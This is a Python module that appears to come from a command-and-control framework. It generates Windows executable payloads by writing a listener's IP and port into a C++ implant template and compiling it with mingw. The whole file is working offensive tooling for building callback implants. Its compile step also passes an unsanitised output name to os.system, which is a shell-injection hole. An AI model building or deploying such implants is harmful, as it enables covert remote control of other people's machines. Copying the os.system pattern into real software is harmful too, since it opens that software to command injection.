from shutil import copyfile,copy2

from core.common import *
from core.listenershelpers import listeners, isValidListener, checkListenersEmpty

import re

Payloads = {
    "winexe" : "Windows executable.",
}

vPayloads = [payload for payload in Payloads]
vArchs    = ["x64", "x32"]

def replace_placeholders(file_path, ip_value, port_value):
    # Read the C++ file
    with open(file_path, 'r') as file:
        code = file.read()

    # Define placeholders
    ip_placeholder = r'{{IP_PLACEHOLDER}}'
    port_placeholder = r'{{PORT_PLACEHOLDER}}'

    # Replace placeholders with actual values
    code = re.sub(ip_placeholder, ip_value, code)
    code = re.sub(port_placeholder, str(port_value), code)

    # Write the modified code back to the file
    with open(file_path, 'w') as file:
        file.write(code)

def isValidPayload(name, s):

    if name in vPayloads:
        return True
    else:
        if s == 1:
            error("Invalid payload type.")
            return False
        else:
            return False

def isValidArch(arch, s):

    if arch in vArchs:
        return True
    else:
        if s == 1:
            error("Invalid architecture.")
            return False
        else:
            return False

def viewPayloads():

    success("Available payload types: ")

    print(YELLOW)
    print(" Type                         Description")
    print("------                       -------------")
    
    for i in Payloads:
        print(" {}".format(i) + " " * (29 - len(i)) + "{}".format(Payloads[i]))
    
    print(cRESET)

def winexe(listener, arch, outputname):

    outpath = "./output/{}".format(outputname)
    ip      = listeners[listener].ipaddress
    port    = listeners[listener].port

    cpp_file_path = './templates/winexe_template.cpp'
    cpp_output_path = './output/{}.cpp'.format(outputname)

    copy2(cpp_file_path, cpp_output_path)
    # Replace placeholders in the C++ file
    replace_placeholders(cpp_output_path, ip, port)
    compile_command = "x86_64-w64-mingw32-g++ " + cpp_output_path + " -w -fpermissive -static -O3 -lwinhttp -o " + outpath
    os.system(compile_command)
    print("[+] Compiled exe with args: %s" % compile_command)  

    success("File saved in: {}".format(outpath))

def generatePayload(args):
    
    if len(args) != 4:
        error("Invalid arguments.")
        return 0
    else:
        
        Type       = args[0]
        arch       = args[1]
        listener   = args[2]
        outputname = args[3]
        
        if isValidPayload(Type, 1) == False:
            return 0
        
        if checkListenersEmpty(1) == True:
            return 0

        if isValidListener(listener, 1) == False:
            return 0
        
        if isValidArch(arch, 1) == False:
            return 0
        
        if Type == "winexe":
            winexe(listener, arch, outputname)